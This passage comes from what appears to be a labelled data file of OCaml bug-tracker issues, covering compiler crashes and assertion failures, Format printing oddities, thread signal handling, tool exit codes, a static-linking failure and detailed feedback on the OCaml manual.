(clambda to assembly)\r\n**Monitored by:** @hhugo @gasche\r\n\r\n## Bug description\r\n\r\nWhen mutating a member of a record with an existential type, a caml_modify is generated even though it is know that the member can only hold immediate values.\r\n\r\n```ocaml\r\nmodule Kind = struct\r\n  type _ t =\r\n    | Int : int t\r\nend\r\n\r\nmodule R = struct\r\n  type t =\r\n    | T :\r\n        { kind : 'a Kind.t\r\n        ; mutable m : 'a\r\n        } -> t\r\nend\r\n\r\nlet mutate r (v : int) =\r\n  let open R in\r\n  let T ({ kind = Kind.Int; _} as r) = r in\r\n  (* caml_modify is used here, even though r.m can only\r\n     contain ints *)\r\n  r.m <- v\r\n```"},{"labels":["bug",null],"text":"**Original bug ID:** 7720\n**Reporter:** gmelquiond\n**Assigned to:** @Octachron\n**Status:** assigned (set by @Octachron on 2018-02-04T17:24:44Z)\n**Resolution:** open\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.06.0\n**Category:** standard library\n**Has duplicate:** #7804\n\n## Bug description\n\nThe code\r\n\r\n  Format.set_margin 10; Format.printf \"@[@[123456@ @[A@]@ B@]@]@\\n\";;\r\n\r\nproduces\r\n\r\n  123456=\r\n  A B\r\n\r\nwhere = denotes a spurious space.\r\n\r\nI am also wondering why A was not put at the end of the first line. (Removing the box around A does so. Removing one of the outer boxes does so too. Removing B does so too.) I guess the two issues are related.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7717\n**Reporter:** @chambart\n**Assigned to:** @chambart\n**Status:** resolved (set by @chambart on 2018-02-01T21:00:04Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.06.0\n**Fixed in version:** 4.07.0+dev/beta2/rc1/rc2\n**Category:** typing\n\n## Bug description\n\nThe Typecore.classify_expression considers Texp_construct as a construction of statically known size, even for unboxed constructors. The provided example Segfaults.\n\n## Steps to reproduce\n\ntype a = A of b [@@unboxed]\r\nand b = X of a | Y\r\n\r\nlet rec a =\r\n  A\r\n    (if Sys.opaque_identity true then\r\n       X a\r\n     else\r\n       Y)\r\n\r\nlet v =\r\n  match a with\r\n  | A (X (A (X v))) ->\r\n    v\r\n  | _ -> a\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7715\n**Reporter:** gmelquiond\n**Status:** confirmed (set by @Octachron on 2018-01-29T22:56:03Z)\n**Resolution:** open\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.06.0\n**Category:** standard library\n\n## Bug description\n\nAbout basic compacting boxes, the documentation of Format says:\r\n\r\n  \"a break hint also splits the line if the splitting ``moves to the left'' (i.e. the new line gets an indentation smaller than the one of the current line).\"\r\n\r\nand the Bonichon-Weis paper agrees with it:\r\n\r\n  \"if splitting the line reduces the current indentation, a break hint splits the line, even if there is still enough room left on the current line.\"\r\n\r\nSo, when executing\r\n\r\n  Format.printf \"@[<2>a@ @[<v 2>(b@,c@,d)@]@ e@]@.\";;\r\n\r\nI expect the following output\r\n\r\n  a.(b\r\n  ....c\r\n  ....d)\r\n  ..e\r\n\r\nIndeed, even if there is still some space on the line starting with d, since the current indentation is 4 while the indentation of e is 2, the box containing e should be put on a new line. But in practice, the output is the same as for a hov box:\r\n\r\n  a.(b\r\n  ....c\r\n  ....d).e\r\n\r\nEven stranger, since the width of the broken output above is 8, reducing the margin to 9 should not change the output. Yet it actually fixes the bug.\r\n\r\nMore generally, as long as there are sufficiently many boxes, the output eventually becomes as documented. For example, with the default margin of 78, the following code starts behaving correctly once 71 iterations are reached.\r\n\r\n  Format.printf \"@[<2>a@ @[<v 2>(\";\r\n  for i = 1 to 71 do Format.printf \"b@,\" done;\r\n  Format.printf \"b)@]@ e@]@.\";;\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7714\n**Reporter:** @c-cube\n**Status:** resolved (set by @xavierleroy on 2018-06-20T14:12:21Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Platform:** linux\n**Version:** 4.05.0\n**Fixed in version:** 4.07.0+dev/beta2/rc1/rc2\n**Category:** middle end (typedtree to clambda)\n**Monitored by:** @nojb @gasche\n\n## Bug description\n\nI've got a compilation error in flambda when I compile the benchmarks of containers:\r\n\r\n> >> Fatal error: Missing renaming for specialised argument of a function being duplicated but not directly applied: add_list_/473936 -> add_list_/473334(= \r\n(move_within_set_of_closures\r\n  CCHashTrie.add_list__surrogate/3068 <-- CCHashTrie.add_list_/811\r\n  (closure = add_list_/473937))).\r\n\r\nSee attached log of the build failure for more details. I've got the same error in 4.06.0+flambda.\n\n## Steps to reproduce\n\ngit clone https://github.com/c-cube/ocaml-containers\r\ncd ocaml-containers\r\ngit checkout 7df23d0ccaf9e9d36455f8ca1a2db959e6e1f868\r\nopam install jbuilder gen sequence qcheck benchmark\r\nmake benchs\n\n## File attachments\n\n- [error.txt](https://gist.githubusercontent.com/vicuna/af715c0deece72f9195f5d0751332aaa/raw/5aaeaa0c8d1b73bfd9ff3d74a7978536a128aa2a/error.txt)\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7713\n**Reporter:** aha\n**Assigned to:** @maranget\n**Status:** resolved (set by @xavierleroy on 2018-06-09T08:43:31Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Fixed in version:** 4.06.1\n**Category:** typing\n**Monitored by:** @nojb @gasche\n\n## Bug description\n\nThe following code snippet triggers an assert failure with the first release candidate of OCaml 4.06.1. All previous OCaml versions and 4.07.0+trunk accept it:\r\n\r\nexception A of int\r\nexception B of (int * int)\r\n\r\nlet f g =\r\n  try\r\n    g ()\r\n  with\r\n  | A(1|2) -> 1\r\n  | B(1,2) -> 2\r\n\r\n\r\nFatal error: exception File \"typing/parmatch.ml\", line 177, characters 12-18: Assertion failed\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7712\n**Reporter:** mkoconnor\n**Assigned to:** @garrigue\n**Status:** resolved (set by @trefis on 2018-01-23T10:25:57Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Fixed in version:** 4.07.0+dev/beta2/rc1/rc2\n**Category:** typing\n**Monitored by:** @nojb @gasche\n\n## Bug description\n\nThe following code raises an assertion failure in the compiler for me:\r\n\r\ntype 'a or_error = string\r\n\r\ntype ('a, 'b) t_ =\r\n  | Bar : ('a, 'a or_error) t_\r\n\r\ntype 'a t = ('a, 'a) t_\r\n\r\nlet f : type a. a t -> a t = function\r\n  | Bar -> Bar\r\n\r\nThe first few lines of the stack trace are:\r\n\r\nFatal error: exception File \"typing/btype.ml\", line 585, characters 6-12: Assertion failed\r\nRaised at file \"typing/btype.ml\", line 585, characters 6-18\r\nCalled from file \"typing/btype.ml\", line 595, characters 13-40\r\nCalled from file \"typing/ctype.ml\", line 2541, characters 12-34\r\nCalled from file \"typing/ctype.ml\", line 2395, characters 8-32\r\nRe-raised at file \"typing/ctype.ml\", line 2459, characters 20-188\r\nCalled from file \"typing/ctype.ml\", line 2355, characters 8-24\r\nRe-raised at file \"typing/ctype.ml\", line 2396, characters 29-51\r\nCalled from file \"list.ml\", line 122, characters 24-31\r\n...\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7711\n**Reporter:** @Octachron\n**Assigned to:** @garrigue\n**Status:** resolved (set by @garrigue on 2018-01-30T07:09:55Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.07.0+dev/beta2/rc1/rc2\n**Fixed in version:** 4.07.0+dev/beta2/rc1/rc2\n**Category:** typing\n**Monitored by:** @nojb @gasche\n\n## Bug description\n\nThe following code fails (on ? â 4.02.3 â trunk) with a failed assertion in Ctype.object_fields:\r\n\r\ntype 'a r = <w: int -> int; .. > as 'a\r\nclass type virtual ct = object('self)\r\nconstraint 'self = 'not_self r\r\nend\r\n\r\nNote also that the snippet above compiles fine if 'not_self is replaced by 'self, if the type constructor r is inlined, or if ct is made a virtual class.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7710\n**Reporter:** baileyparker\n**Status:** resolved (set by @xavierleroy on 2018-02-11T13:55:42Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.06.0\n**Target version:** 4.07.0+dev/beta2/rc1/rc2\n**Fixed in version:** 4.07.0+dev/beta2/rc1/rc2\n**Category:** tools (ocaml{lex,yacc,dep,debug,...})\n**Monitored by:** @nojb @dbuenzli\n\n## Bug description\n\nIf you try running ocamldep on mli files that cyclicly reference eachother, you receive a warning printed to stderr, but ocamldep still prints an ordering and returns 0.\r\n\r\nGiven that cyclically referencing files are illegal, it should at least return a non-zero status (and probably shouldn't print an order since it is impossible to order cyclically referential files). Currently, when used in a scripting context, you have to (fragilely) search stderr for \"Warning: cycle in dependencies.\" to determine if the output list is actually valid (because if you just try to `ocamlc -c *.mli` in the returned order you will get an unhelped message that B is unbound--not that there were cyclic references).\n\n## Steps to reproduce\n\na.mli:\r\n  type bill = { a : int }\r\n  val foo : B.baz -> int\r\n\r\nb.mli:\r\n  type bar = { a : int; b : int }\r\n  val baz : bar -> A.bill -> int\r\n\r\n1. Place the above into files in the same directory\r\n2. Run ocamldep -sort a.mli b.mli\r\n3. Notice the \"Warning: cycle in dependencies. End of list is not sorted.\"\r\n4. Notice echo $? is 0\n\n## Additional information\n\nRelevant code: https://github.com/ocaml/ocaml/blob/8daa184d95d30e28ea7cae60d366b39d9a509c78/driver/makedepend.ml#L466-L467\n"},{"labels":["bug",null,null],"text":"**Original bug ID:** 7709\n**Reporter:** @jhjourdan\n**Assigned to:** @jhjourdan\n**Status:** resolved (set by @jhjourdan on 2018-12-19T14:10:56Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Fixed in version:** 4.08.0+dev/beta1/beta2\n**Category:** threads\n**Duplicate of:** #4127\n**Monitored by:** enrico @gasche\n\n## Bug description\n\nWhen using [Thread.sigmask] to mask signals in some thread (that is, to make sure that signals are received in one particular thread, for example), it seems like signals can be received even by threads for which signals are blocked.\r\n\r\nAs an example, I join a test to the bug report. In that example, 3 computation-intensive threads are launched, and the signals are blocked for those. In the main thread, I unblock the signal and setup a signal handler that raises an exception. By catching the exception, I can determine which thread handled the signal. It seems like any thread can receive the signal.\r\n\r\nBy reading the runtime of OCaml, the cause of the bug seems easy to understand: The posix thread that receives the signal sets [caml_pending_signals], and then any thread can see this flag and run the OCaml handler.\r\n\r\nI am not sure what is the best way to fix this issue:\r\n\r\n(a) Have a per-thread [caml_pending_signals]. When the current thread is not executing, the signal handler should access thread local storage of the current thread to set [caml_pending_signals]. The same kind of idea applies for [caml_something_to_do]. The main problem I foresee is that we will have to setup a different handler when the [Thread] module is loaded or not. \r\n\r\n(b) Before launching an OCaml handler, check that the signal is not blocked in the current thread. If it is, then we do not do anything and let another thread handle the signal. Then, we will have to change the implementation of [unix_sigpending] to take into account [caml_pending_signals]. Moreover, while signal is pending, each minor gc pass will trigger a call to [sigprocmask], and I am not sure this has actual negligible performance cost.\r\n\r\nMoreover, I have no idea how this will interact with #1128.\n\n## File attachments\n\n- [test2.ml](https://gist.githubusercontent.com/vicuna/2699ea977d439d5d51356d8290c55ea7/raw/a4177bed80ee9411b5914574e1831bc220a135c0/test2.ml)\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7706\r\n**Reporter:** @lpw25\r\n**Assigned to:** @gasche\r\n**Status:** resolved (set by @gasche on 2018-04-10T10:35:19Z)\r\n**Resolution:** fixed\r\n**Priority:** normal\r\n**Severity:** minor\r\n**Version:** 4.06.0\r\n**Fixed in version:** 4.07.0+dev/beta2/rc1/rc2\r\n**Category:** typing\r\n**Related to:** #7768\r\n**Monitored by:** @nojb @yallop\r\n\r\n## Bug description\r\n\r\nThe new recursive value check is too relaxed in how it treats [let] when it decides if a recursive definition's size can be calculated in advance:\r\n\r\n```\r\n        OCaml version 4.06.0+beta1\r\n\r\n# let rec x =\r\n    let y = if false then (fun z -> 1) else (fun z -> x 4 + 1) in\r\n    y;;\r\n    val x : int -> int = <fun>\r\n# x 42;;\r\n\r\nProcess ocaml-toplevel segmentation fault\r\n```"},{"labels":["bug",null],"text":"**Original bug ID:** 7705\n**Reporter:** @yallop\n**Assigned to:** @nojb\n**Status:** resolved (set by @gasche on 2018-01-04T13:26:49Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** crash\n**Fixed in version:** 4.07.0+dev/beta2/rc1/rc2\n**Category:** otherlibs\n**Monitored by:** @nojb @gasche @dbuenzli\n\n## Bug description\n\n$ ocaml\r\n           OCaml version 4.06.0\r\n   \r\n   # #load \"bigarray.cma\";;\r\n   # Bigarray.(Genarray.nth_dim (Genarray.create int c_layout [|1|]) (-1000000));;\r\n   Segmentation fault\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7704\n**Reporter:** @yallop\n**Assigned to:** @garrigue\n**Status:** resolved (set by @garrigue on 2018-01-09T07:50:05Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** crash\n**Fixed in version:** 4.06.1+dev/rc1/rc2\n**Category:** typing\n**Monitored by:** igarnier @nojb @gasche\n\n## Bug description\n\nWith OCaml 4.06.0:\r\n\r\n   $ cat pr.ml \r\n   module M : sig\r\n     type  t = private [> `A of string ]\r\n     val x : t\r\n   end =\r\n   struct\r\n     type t = private [> `A of string | `B ] \r\n     let x = `B\r\n   end\r\n\r\n   let _ = match M.x with `A s -> s\r\n\r\n   $ ocaml pr.ml \r\n   Segmentation fault\n\n## Additional information\n\nInspired by PR7703\n"},{"labels":[null,"bug"],"text":"**Original bug ID:** 7702\n**Reporter:** chengsun\n**Assigned to:** @gasche\n**Status:** resolved (set by @gasche on 2018-01-11T10:33:51Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** crash\n**Version:** 4.06.0\n**Fixed in version:** 4.07.0+dev/beta2/rc1/rc2\n**Category:** back end (clambda to assembly)\n**Monitored by:** chengsun @nojb @hhugo @gasche @Yakobowski\n\n## Bug description\n\nThe attached code miscompiles (on 4.03.0 through trunk, no flambda) due to cross-module inlining.\r\n\r\nThe cmm generated for b.ml looks incorrect. As far as I can tell, an ID is generated for a catch lambda using next_raise_count, but this ID is already used in the clambda inlined from a.ml.\r\n\r\n\r\na.ml:\r\n\r\nlet _unused _ = try () with _ -> ()\r\n\r\nlet trigger_bug x =\r\n  let ok =\r\n    match x with\r\n    | None\r\n    | Some \"\" -> true\r\n    | Some _  -> false\r\n  in\r\n  if x = Some \"\" && not ok then\r\n    failwith \"impossible\"\r\n[@@inline always]\r\n\r\n\r\nb.ml:\r\n\r\nlet bug x = A.trigger_bug x\r\n\r\n\r\nc.ml:\r\n\r\nlet () =                                                                                                  \r\n  B.bug (Some \"\");                                                              \r\n  Printf.printf \"Bug failed to trigger :(\\n\n\n## Steps to reproduce\n\n$ tar xzf bug.tar.gz\r\n$ ./compile.sh\r\n$ ./a.out\r\nFatal error: exception Failure(\"impossible\")\n\n## File attachments\n\n- [bug.tar.gz](https://gist.githubusercontent.com/vicuna/317a5c123453f5dd5f7d6a87a50a5181/raw/62803cc8c058ec28e2e9ffc057315221bacd3a21/bug.tar.gz)\n"},{"labels":["bug",null,null],"text":"**Original bug ID:** 7701\n**Reporter:** antron\n**Assigned to:** @lpw25\n**Status:** resolved (set by @gasche on 2018-05-05T14:00:49Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.06.0\n**Fixed in version:** 4.07.0+dev/beta2/rc1/rc2\n**Category:** typing\n**Duplicate of:** #7138\n**Monitored by:** @gasche\n\n## Bug description\n\nWhen an .mli file consists of only a (** ... *) comment, the comment does not appear in the signature item list of the signature read from the corresponding .cmti file. By contrast, if the signature includes a comment and some other items, the comment appears in the signature item list.\n\n## Steps to reproduce\n\nempty.mli:\r\n\r\n(** This comment will be lost by the compiler. *)\r\n\r\n\r\nnonempty.mli:\r\n\r\n(** This comment will be kept by the compiler. *)\r\n\r\nval foo : unit\r\n\r\n\r\ncount_sig_items.ml:\r\n\r\nlet () =\r\n  let file = Sys.argv.(1) in\r\n  let cmt = Cmt_format.read_cmt file in\r\n  match cmt.cmt_annots with\r\n  | Interface signature ->\r\n    signature.Typedtree.sig_items\r\n    |> List.length\r\n    |> string_of_int\r\n    |> print_endline\r\n  | _ ->\r\n    assert false\r\n\r\n\r\nMakefile:\r\n\r\n.PHONY : reproduce\r\nreproduce :\r\n\tocamlc -version\r\n\tocamlc -bin-annot -o empty.cmi -c empty.mli\r\n\tocamlc -bin-annot -o nonempty.cmi -c nonempty.mli\r\n\tocamlfind opt -linkpkg -package compiler-libs.common count_sig_items.ml\r\n\t./a.out empty.cmti\r\n\t./a.out nonempty.cmti\r\n\r\n.PHONY : clean\r\nclean :\r\n\trm -f *.cmi *.cmti *.cmx *.o a.out\r\n\r\n\r\nRunning this (make), the output is:\r\n\r\nocamlc -version\r\n4.06.0\r\nocamlc -bin-annot -o empty.cmi -c empty.mli\r\nocamlc -bin-annot -o nonempty.cmi -c nonempty.mli\r\nocamlfind opt -linkpkg -package compiler-libs.common count_sig_items.ml\r\n./a.out empty.cmti\r\n0\r\n./a.out nonempty.cmti\r\n2\r\n\r\n\r\nI would expect the output to be 1, 2.\n"},{"labels":[null,"bug",null],"text":"**Original bug ID:** 7700\n**Reporter:** gabelevi\n**Status:** acknowledged (set by @dra27 on 2017-12-27T20:21:03Z)\n**Resolution:** open\n**Priority:** normal\n**Severity:** minor\n**Platform:** unix\n**Version:** 4.00.1\n**Target version:** 4.07.0+dev/beta2/rc1/rc2\n**Category:** standard library\n**Monitored by:** antron @nojb @dbuenzli\n\n## Bug description\n\nUnix.select's c implementation will raise EINVAL if any fd passed in is less than 0 or greater or equal to FD_SETSIZE (https://github.com/ocaml/ocaml/blob/1707e24f0001a122f6e71eba237b1044e5f0bfa1/otherlibs/unix/select.c#L84). This behavior was introduced in ocaml/ocaml#5563\r\n\r\nThe main problem is that select should raise EBADF for invalid file descriptors.\r\n\r\nAssuming that there are valid fds which are greater than or equal to FD_SETSIZE, perhaps a better behavior would be\r\n\r\n* If fd is less than 0, then raise EBADF\r\n* If fd is greater than or equal to FD_SETSIZE, then check if it is a valid fd. Raise EBADF on an invalid fd and EINVAL otherwise\n\n## Steps to reproduce\n\nI found this issue by looking at stack traces in some of my logs. It should be pretty easy to reproduce, though, by crafting an invalid fd < 0 or >= FD_SETSIZE and passing it to Unix.select.\n\n## Additional information\n\nI encountered this using lwt, which explicitly handles EBADF and filters out bad fds: https://github.com/ocsigen/lwt/blob/5b61d2a0e18b47ec82dfc61ce0bcb68f4a3945c7/src/unix/lwt_engine.ml#L364\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7699\n**Reporter:** ubsan\n**Status:** resolved (set by @xavierleroy on 2018-01-12T13:01:08Z)\n**Resolution:** not fixable\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.06.0\n**Category:** typing\n\n## Bug description\n\nGiven two recursive modules `T1` and `T2`, and an opaque type `T1.t` which is equal to `b`, references to `T1.t` in `T2` are not normalized to have type `b` in `T1`.\n\n## Steps to reproduce\n\n```\r\nmodule rec Foo : sig\r\n  val make: Bar.t\r\nend = struct\r\n  let make = Bar.make\r\nend and Bar : sig\r\n  type t\r\n  val make: t\r\nend = struct\r\n  type t = unit\r\n  let make = ()\r\n  let _: unit = Foo.make\r\nend\r\n```\r\n\r\ngives the error:\r\n\r\nFile \"./test.ml\", line 11, characters 16-24:\r\nError: This expression has type Bar.t but an expression was expected of type\r\n         unit\n\n## Additional information\n\nOne can get around this issue by not using type aliases - I've gotten around this in my own code with a single-variant variant type.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7698\n**Reporter:** jfehrle\n**Assigned to:** @Octachron\n**Status:** assigned (set by @Octachron on 2018-01-02T13:58:02Z)\n**Resolution:** open\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.06.0\n**Category:** documentation\n**Monitored by:** @nojb @Yakobowski\n\n## Bug description\n\nI found \"The OCaml system release 4.06\" was not so easy to read and understand.  This will tend to slow down and discourage people who want to learn and use OCaml.  I will be looking at some OCaml books, but so far I haven't found one that looks to be what I want.  Something that's as readable as \"The C Programming Language\" would be fabulous.\r\n\r\nThese comments are for the first 2 1/2 chapters.  I'd be happy to a) read revisions and b) submit comments on the other chapters if someone undertakes improving the document.\n\n## Additional information\n\nOCaml Comments:\r\n\r\nPage 13:\r\n\r\nâA good familiarity with programming in conventional languages (say, Pascal or C) is assumed, but no prior exposure to functional languages is assumed.â\r\n\r\nThe text assumes a number of details that would be unfamiliar to a C programmer.  No need to mention Pascal any more, it is little used.  You might refer to Java or C++, which could be useful for comparison in Chapter 3.\r\n\r\n\r\nâ1.1 Basicsâ\r\n\r\nIâd like a very high-level overview of OCaml in just a few pages before seeing any examples.  This is to get context and so I have an idea what to expect in the document before providing a full discussion of a topic.  Some repetition is helpful to the reader. From my OCaml beginnerâs perspective, some of the interesting points to get out early would be:\r\n-\tThe extensive type system\r\n-\tType inference (but you can specify explicitly when necessary in some places?)\r\n-\tThe use of type variables\r\n-\tCreating variant types that are unions of other types\r\n-\tThe fact that the type checking is totally rigorous and that there are no automatic conversions\r\n-\tThat type information is not available at runtime (unlike Reflection in Java, for example).\r\n-\tData types (primitive, arrays, lists, tuples, records, classes/objects, ?)\r\n-\tPatterns\r\n-\tSupport for functional, imperative and object-oriented paradigms\r\n-\tModules for managing large projects\r\n-\tDifferences between the top level and compiled programs (e.g. for modules)  (Note that the top level is good for experimentation but probably not as useful for large multi-file projects such as Coq)\r\n\r\nWhat is the relation to ML?  Would any of the ML documentation be helpful in learning OCaml?\r\n\r\nAlso, it would great to include some motivational examples of things that you do easily in OCaml that are harder to do in C++/Java.\r\n\r\nExplain ;; would generally not be used in programs complied from source files rather than typed into the top level.\r\n\r\nExplain that âfloat -> floatâ or âint -> int -> intâ is a function signature.  This notation would be completely unknown to C/Java developers.  Also say a little about where this notation came from (mathematical logic) and why it is preferred over more common notation such as âf(int, int) -> intâ or âint f(int, int)â.\r\n\r\nPage 14:\r\n\r\nâGeneral mechanisms for defining your own data structures are also provided.â\r\n\r\nHow about saying âThere are also general mechanisms for defining your own data structures.  These are records and classes, which will be covered shortly.â?\r\n\r\nâList patterns have the exact same shape as list expressions.â\r\n\r\nUnless âshapeâ is a technical term, I think âformâ is probably a much word choice.\r\n\r\nâandâ in code example â would be helpful to say what this means rather than let the reader guess.  Why use the âandâ instead of 2 top-level letâs?  Also, somewhere say something about indentation conventions.  This seems like it may be the convention, but it is unfamiliar to C/Java developers:\r\n\r\nlet x = â¦ in\r\nlet y = â¦ in\r\nlast_expression\r\n\r\nPage 15:\r\n\r\nâmodify in-place a listâ -> âmodify a list in placeâ  (English syntax)\r\n\r\nâsinââ â mention what characters are allowed in identifiers.  Apostrophe is not allowed in C or Java.\r\n\r\nPage 16:\r\n\r\nâto expand directlyâ -> âto directly expandâ\r\n\r\nPage 17:\r\n\r\nMention âwithâ is a keyword.\r\n\r\nâall possible shapesâ -> âall possible formsâ\r\n\r\nIn âFloat of floatâ, the âofâ is a keyword, just syntactic sugar?  And the âintâ or âfloatâ could be any type, such as an array of int tuples?\r\n\r\n âConstructor names are capitalizedâ â would be good to naming conventions a short section so it can be found later and indexed.\r\n\r\nâmatch (n1, n2)â â this is matching on a tuple, right?  Maybe worth noting.  Can you match on simple types (booleans, ints)?  Anything else?\r\n\r\nPage 18:\r\n\r\nââaâ - Mention the convention that a symbol starting with an apostrophe is a type variable.\r\n\r\nâtwo subtrees containing alsoâ -> âtwo subtrees also containingâ\r\n\r\nPage 19:\r\n\r\nâArrays are given in extension between [| and |] brackets, â¦â â the first part of the sentence lets you give the values of the array elements, while Array.make is much less flexible.  âgiven in extensionâ is not standard English.  Maybe split into 2 sentences.  âArrays containing values can be provided as a series of semicolon-separated values betwees [| and |] brackets.â\r\n\r\nââ¦ references, which are mutable indirection cells (or one-element arrays)â  seems inconsistent with the statement on page 20: ââ¦ references: they are implemented as a single-field mutable record, as follows:â\r\n\r\nPage 20:\r\n\r\nâlet ( ! ) = â¦â  Would you explain the syntax of â( ! )â?  You couldnât do this in C/Java.  Probably in C++.\r\n\r\nJust curious:  Is there a way to explicitly specify the type of a functionsâ arguments?  Or is it always inferred?\r\n\r\nâWithout user-provided type annotations, this is not allowed, as polymorphism is only introduced on a global level.â  This sentence is hard to understand; the negative âwithoutâ and ânot allowedâ are a little confusing.  Maybe say something like âDoing this requires user-provided type annotation, since polymorphism is only introduced automatically for global (top-level?) definitions.â?\r\n\r\nâmutable id: âa. âa -> âaâ  The period is just to mark the end of the type of id?\r\n\r\nPage 21:\r\n\r\nâExceptions can also be used as a general-purpose non-local control structure.â  At least within the Java community, I think many people would disagree with this.  It can easily be abused.  Exceptions should be for truly exceptional conditions (errors), not as a general-purpose control structure.\r\n\r\nâThe with part is actually a regular pattern-matching on the exception value.â  âregularâ makes me think of regular expressions.  I think you mean it does the usual/normal pattern matching.  Maybe \r\nsay âThe with part does pattern matching on the exception value.â?\r\n\r\nâthen raising again the exceptionâ -> âthen raising the exception againâ\r\n\r\nPage 22:\r\n\r\nâexpression * expressionâ â I donât fully understand the syntax.  Is this defining a tuple?  Why is the â*â needed?  Of course, it is not multiplication, but a little odd to see in an expression evaluator when the comments use â*â to mean multiplication, slightly confusing, maybe worth a short comment.\r\n\r\nPage 27:\r\n\r\nWhen I hear the term âstructure,â it makes me think of data structures.  In C, âstructâ is a keyword used to define their equivalent to records.\r\n\r\nThe simpler use of modules is to manage a large body of code and its name spaces.  Functors more complex and are fairly similar to parameterized classes in Java.  I would introduce these two uses in that order.  Key points on managing a large body of code:\r\n-\tEach module has its own namespace\r\n-\tBy default, each source file defines a separate module matching the file name.\r\n-\tUse PrioQueue.empty to refer to an item in module PrioQueue.  (How do you distinguish between the modules from 2 source files dir1/foo.ml and dir2/foo.ml?)\r\n-\tUse open to include another moduleâs definitions in the current name space.  (What happens if the name is used in 2 imports?  Or used in an import but also defined in the current module?)\r\n-\tâlet open xxx inâ construct\r\n-\tCreating multiple modules in one source file?  (Is it possible and is it a good practice?  Seem like it would simpler to stick to using the file name as the module name.)\r\n-\tCan module definitions be nested?  If thatâs useful.\r\n-\tThe relationship between .mli files and modules (section 2.5 with some editing to avoid introducing signatures)\r\n\r\nI wouldnât mention signatures or show them in examples until after the above points are covered.\r\n\r\nPage 31:\r\n\r\nâFunctors are âfunctionsâ from structures to structuresâ  They are not general functions at all, are they?  As far as I can tell, they only allow substitution for specific parameters.  So the first sentence is misleading and would best be removed.  The paragraph could begin with âFunctors let you create parameterized signatures and then provide the parameter(s) to get a specific implementation.  For instance â¦â\r\n\r\nThe example is so long itâs a bit hard to follow.  Maybe it could be done in two parts: first, a skeleton of the high-level structure with a few comments, such as:\r\n\r\n\tmodule type ORDERED_TYPE =  sig â¦\r\n\tmodule Set = \r\n\t\tfunctor (Elt: ORDERED_TYPE) ->  struct â¦\r\n\tmodule OrderedString = struct â¦\t(* matching the signature of ORDERED_TYPE *)\r\n\tmodule StringSet = Set(OrderedString);;\r\n\r\nThen show the details of ORDERED_TYPE, Set and OrderedString.\r\n\r\nPage 33:\r\n\r\nFor the first example, it would help to describe whatâs been changed or highlight the differences more thoroughly.  That saves the reader from having to do a diff in their heads between the two pages.  If the differences could be in boldface, that would be great.\r\n\r\nAlso, I notice the signature for âaddâ is slightly different between this example and the earlier one.  Maybe worth mentioning/explaining?\r\n\r\nThe rest of section 2.4 is too much detail at this point.  Plus itâs a bit of work to pick out the differences compared to the earlier examples.  The lengthy discussion and example makes me think itâs complicated.\r\n\r\nPage 37:\r\n\r\nTo me, this section seems to be showing how powerful the type system is and how you can get all kinds of different behavior for subclassing, self, etc.  Itâs too much.  I would suggest taking examples from Java and C++ classes/objects and showing how to create equivalent constructs in OCamlâmore of a cookbook approach.  It seems to me there are a huge number of things you can do with the type system, of which only a few are really useful.  If youâre writing a program with classes and objects, you probably want them all to have similar behavior with regards to subclassing, self, etc. just for your own sanity.\r\n\r\nPage 39:\r\n\r\nThe first example (with ânew point;;â and ânew point 7;;â) is confusing.  In the latter, ânew pointâ is done first, then the resulting function is called with an argument of 7?  Then seems to go against the grain of OCaml expressions and is worthy of explanation.  ânewâ is a keyword, right?\r\n\r\nPage 40:\r\n\r\nâlet minmax x y =â\r\n\r\nThis is contrived example.  No one would write this in real life.  Would be better to have a realistic example.  Also using more lines for the example with better indentation would help readability.\r\n\r\n\r\nPage 41:\r\n\r\nâcan send messages to selfâ  This is confusing.  I think whatâs meant is that itâs possible to refer to methods and variables that are part of the object.  Iâm vaguely aware of an object metaphor based on messages, but it seems to me OCaml does not actually create messages.\r\n\r\nPage 42:\r\n\r\nâVirtual methodsâ  Could mention that these are called abstract methods in Java.  C++ has virtual methods but I think the concept is slightly different.\r\n\r\nIâll stop here.  Enough for now.\r\n\r\n\r\nScoping?\r\nFlow of control (and loops, etc.)\n"},{"labels":[null,"bug",null],"text":"**Original bug ID:** 7697\n**Reporter:** korovin\n**Status:** confirmed (set by @nojb on 2017-12-22T16:42:41Z)\n**Resolution:** open\n**Priority:** normal\n**Severity:** minor\n**OS:** Ubuntu\n**OS Version:** 14.04.4\n**Version:** 4.06.0\n**Category:** platform support (windows, cross-compilation, etc)\n**Related to:** #7562\n**Monitored by:** @nojb @gasche\n\n## Bug description\n\nHello, \r\n\r\nCould you please take a look at the following issue.\r\nAfter switching from OCaml 4.05 to 4.06 my project fails to link statically (if I switch back to 4.05 it compiles and links statically fine). \r\n\r\nocamlopt -ccopt -static  ...\r\n\r\nThe error message: \r\n\r\n/usr/bin/ld: dynamic STT_GNU_IFUNC symbol `floor' with pointer equality in `/usr/lib/gcc/x86_64-linux-gnu/4.8/../../../x86_64-linux-gnu/libm.a(s_floor.o)' cannot be used when making an executable; recompile with -fPIE and relink with -pie\r\ncollect2: error: ld returned 1 exit 